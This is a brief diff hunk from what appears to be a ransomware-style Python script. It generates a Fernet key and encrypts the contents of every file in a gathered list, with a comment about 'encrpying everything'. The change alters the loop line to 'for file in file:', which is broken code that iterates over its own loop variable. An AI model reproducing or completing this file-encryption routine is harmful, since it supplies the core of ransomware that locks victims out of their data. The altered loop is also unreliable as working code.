@@ -30,7 +30,7 @@ print(files)
 secretkey = Fernet.generate_key()
 
 # Going through the files list and encrpying everything
-for file in tool:
+for file in file:
 	with open(file, "rb") as thefile:
 		contents = thefile.read()
 	contents_encrypted = Fernet(secretkey).encrypt(contents)
